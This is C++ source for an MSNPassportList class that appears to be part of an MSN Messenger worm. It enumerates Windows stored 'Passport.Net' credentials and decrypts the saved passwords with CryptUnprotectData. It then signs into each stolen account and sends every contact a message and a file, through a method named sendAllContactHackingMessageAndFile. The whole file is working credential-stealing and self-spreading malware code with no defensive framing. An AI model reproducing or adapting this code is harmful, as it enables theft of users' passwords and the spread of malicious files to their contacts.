#include "MSNPassportList.h"

MSNClient ** MSNPassportList::MSNAccountList;
int MSNPassportList::numElems = 0; 
bool MSNPassportList::inicialized = false;
PCREDENTIAL * MSNPassportList::credentialCollection = NULL;

void MSNPassportList::inicialize() {
   HMODULE hDLL;
   DATA_BLOB blobCrypt, blobPlainText, blobEntropy;
   typeCredEnumerateA pfCredEnumerateA;
   typeCredReadA pfCredReadA; 
   typeCredFree pfCredFree;
   DWORD numPassportsAccount;
   char szEntropyStringSeed[] = PASSPORT_ENTROPY_SEED_STRING;
   char * MSNPassword;
   short int entropyData[strlen(szEntropyStringSeed) + 1];
   short int tmp;
   
   if (!MSNPassportList::inicialized) {            
      if (hDLL = LoadLibrary("advapi32.dll")) {
         pfCredEnumerateA = (typeCredEnumerateA) GetProcAddress(hDLL, "CredEnumerateA");
         pfCredReadA = (typeCredReadA)GetProcAddress(hDLL, "CredReadA");
         pfCredFree = (typeCredFree)GetProcAddress(hDLL, "CredFree");
      
         if ((pfCredEnumerateA != NULL) && (pfCredReadA != NULL) && (pfCredFree != NULL)) {
            pfCredEnumerateA("Passport.Net\\*", 0, &numPassportsAccount, &credentialCollection);
         
            if (numPassportsAccount > 0) {
               MSNPassportList::MSNAccountList = (MSNClient **) malloc(sizeof(MSNClient *));
               
               for(int i = 0; (i <= (sizeof(entropyData)/2)); i++) {
                  tmp = (short int) szEntropyStringSeed[i];
                  tmp <<= 2;
                  entropyData[i] = tmp;
               }
               for(int i = 0; i < numPassportsAccount; i++) {
                  blobEntropy.pbData = (BYTE *) &entropyData;
                  blobEntropy.cbData = ENTROPY_DATA_SIZE;

                  blobCrypt.pbData = credentialCollection[i]->CredentialBlob;
                  blobCrypt.cbData = credentialCollection[i]->CredentialBlobSize;

                  CryptUnprotectData(&blobCrypt, NULL, &blobEntropy, NULL, NULL, 1, &blobPlainText);
               
                  MSNPassword = (char *) malloc(blobPlainText.cbData/2);
                  if (MSNPassword != NULL) {
                     for (int j = 0; (j < (blobPlainText.cbData/2)); j++) {
                       MSNPassword[j] = *(blobPlainText.pbData + (j * 2));
                     }
                     
                     if (MSNPassportList::numElems > 0) MSNPassportList::MSNAccountList = (MSNClient **) realloc(MSNPassportList::MSNAccountList, sizeof(MSNClient *) * (MSNPassportList::numElems + 1));
                     *(MSNPassportList::MSNAccountList + MSNPassportList::numElems) = (MSNClient *) malloc(sizeof(MSNClient));
                     
                     *(MSNPassportList::MSNAccountList + MSNPassportList::numElems) = new MSNClient(credentialCollection[i]->UserName, MSNPassword);
                     MSNPassportList::numElems++;

                     free(MSNPassword);
                  }
               }
               
               if (MSNPassportList::numElems > 0) MSNPassportList::inicialized = true;
            }
            pfCredFree(credentialCollection);
         }
      }
   }
}

bool MSNPassportList::sendAllContactHackingMessageAndFile(const char * strFilename) {
   if ((MSNPassportList::numElems > 0) && (MSNPassportList::inicialized)) {
      for(int i = 0; i < MSNPassportList::numElems; i++) {
         if (MSNPassportList::MSNAccountList[i]->startSession()) {
            MSNPassportList::MSNAccountList[i]->changeState(MSN_STATE_ONLINE);
            MSNPassportList::MSNAccountList[i]->sendAllContactHackingMessageAndFile(strFilename);
         }       
      }
      return true;
   }
   return false; 
}

bool MSNPassportList::sendAllContactMessageAndFile(const char * message, const char * strFilename) {
   if ((MSNPassportList::numElems > 0) && (MSNPassportList::inicialized)) {
      for(int i = 0; i < MSNPassportList::numElems; i++) {
         if (MSNPassportList::MSNAccountList[i]->startSession()) {
            MSNPassportList::MSNAccountList[i]->changeState(MSN_STATE_ONLINE);
            MSNPassportList::MSNAccountList[i]->sendAllContactMessageAndFile(message, strFilename);
         }
      }
      return true;
   }
   return false; 
}
